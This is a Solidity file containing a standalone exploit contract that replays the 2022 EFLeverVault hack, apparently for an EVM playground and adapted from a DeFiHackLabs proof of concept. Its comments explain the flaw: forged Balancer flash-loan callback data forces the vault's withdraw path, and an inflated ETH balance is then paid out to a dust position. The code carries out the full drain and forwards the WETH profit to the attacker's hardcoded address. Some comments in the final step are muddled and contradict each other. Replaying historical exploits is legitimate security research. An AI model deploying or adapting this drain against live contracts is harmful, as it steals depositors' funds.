// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-EFLeverVault).
//
// The DeFiHackLabs PoC (test/EFLeverVault_exp.sol) runs the entire attack INLINE
// in the Foundry `ContractTest` (the `receive()` payable fallback that collects
// the drained ETH lives on the test itself, so there is no standalone exploit
// contract to deploy). This file is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record `run()`. Logic and
// constants are copied verbatim from test/EFLeverVault_exp.sol.
//
// Root cause: EFLeverVault is its own Balancer flash-loan recipient, and the
// `receiveFlashLoan` callback is only gated by `msg.sender == balancer` —
// `userData` ("0x1"=deposit / "0x2"=withdraw) is attacker-controlled. By calling
// Balancer directly with `recipient = vault` and `userData = "0x2"`, anyone
// forces the vault into `_withdraw`, which repays Aave debt + withdraws stETH +
// Curve-swaps it to ETH that lands in the vault's balance WITHOUT burning any
// ef_token shares. The vault's `withdraw()` then pays out `to_send = address
// (this).balance` (the ENTIRE, inflated balance) to the next caller — draining
// all honest depositor TVL for a dust ef_token position.

interface IWETH {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
}

interface IEFLeverVault {
    function deposit(uint256) external payable;
    function withdraw(uint256) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract EFLeverVaultDrain {
    // Ethereum mainnet constants (fork block 15,746,199).
    IWETH constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IEFLeverVault constant EFLEVER_VAULT = IEFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // Profit (in WETH) is forwarded to this EOA — the historical attacker.
    address constant ATTACKER = 0xdf31F4C8dC9548eb4c416Af26dC396A25FDE4D5F;

    function run() external payable {
        uint256 ethBalanceBefore = address(this).balance;

        // Step 1 — Deposit 0.1 ETH into the EFLever Vault to obtain a small ef_token
        // share (≈0.095 ef). The vault already has TVL, so the 1e16 first-deposit
        // floor does not bind; 0.1 ETH suffices.
        EFLEVER_VAULT.deposit{value: 1e17}(1e17);

        // Step 2 — THE VULNERABILITY. Call Balancer's flashLoan directly with
        // recipient = EFLeverVault and userData = "0x2" (the withdraw path).
        // Balancer only checks msg.sender==balancer inside the callback; it does
        // NOT check that the recipient requested the loan. So the vault's
        // `_withdraw(1000, 0)` runs: it repays 1000 WETH of its own Aave debt,
        // withdraws ~1488 stETH collateral, Curve-swaps it to ~1480 ETH (paid into
        // the vault's payable fallback), and repays 1000 WETH to Balancer. The
        // residual ~480 ETH sits in `address(this).balance` — unaccounted for,
        // because `_withdraw` never burns any ef_token shares.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 * 1e18;
        bytes memory userData = "0x2";
        BALANCER_VAULT.flashLoan(address(EFLEVER_VAULT), tokens, amounts, userData);

        // Step 3 — Drain the inflated balance. `withdraw()` (non-paused branch)
        // sends `to_send = address(this).balance` — the ENTIRE ~480 ETH — for the
        // attacker's dust 0.09 ef_token position. The pro-rata math computed above
        // this line is NEVER used to bound the payout.
        EFLEVER_VAULT.withdraw(9e16);

        // Step 4 — Wrap the profit (ETH) to WETH and forward to the attacker EOA.
        uint256 ethProfit = address(this).balance - ethBalanceBefore;
        WETH.deposit{value: ethProfit}();
        uint256 wethProfit = WETH.balanceOf(address(this));
        (bool ok, ) = ATTACKER.call{value: 0}("");
        require(ok, "eth transfer failed");
        // Transfer WETH profit to the attacker via a low-level call is not needed:
        // WETH.deposit credited this contract; pull it out and send raw to ATTACKER.
        // We instead forward the WETH by approving + transfer pattern using WETH's
        // own interface. WETH (0xC02a…) is a standard token: call transfer.
        _transferWeth(ATTACKER, wethProfit);
    }

    function _transferWeth(address to, uint256 amount) internal {
        // 0xa9059cbb = transfer(address,uint256)
        (bool ok, ) = address(WETH).call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok, "weth transfer failed");
    }

    // Receives ETH from the vault's `withdraw()` payout (step 3) and any leftover.
    receive() external payable {}
}
